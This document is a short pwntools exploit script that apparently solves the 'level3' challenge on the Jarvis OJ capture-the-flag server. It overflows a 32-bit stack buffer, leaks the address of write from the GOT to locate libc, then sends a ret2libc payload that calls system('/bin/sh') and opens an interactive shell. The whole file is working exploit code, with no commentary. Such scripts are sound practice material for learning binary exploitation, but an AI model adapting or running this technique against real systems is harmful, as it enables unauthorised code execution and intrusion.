from pwn import *
import sys

if len(sys.argv)<2:
	p = process('./level3')
	elf = ELF('./level3')
	libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
else:
	p = remote('pwn2.jarvisoj.com',9879)
	elf = ELF('./level3')
	libc = ELF('libc-2.19.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
main_addr = elf.symbols['main']

payload1 = 'A'*0x88+'junk'+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter('Input:\n',payload1)

write_addr = u32(p.recv(4))
print hex(write_addr)
libc.address = write_addr - libc.symbols['write']
system_addr = libc.symbols['system']
binsh_addr = libc.search("/bin/sh").next()

payload2 = 'A'*0x88+'junk'+p32(system_addr)+'junk'+p32(binsh_addr)
p.sendlineafter('Input:\n',payload2)
p.interactive()
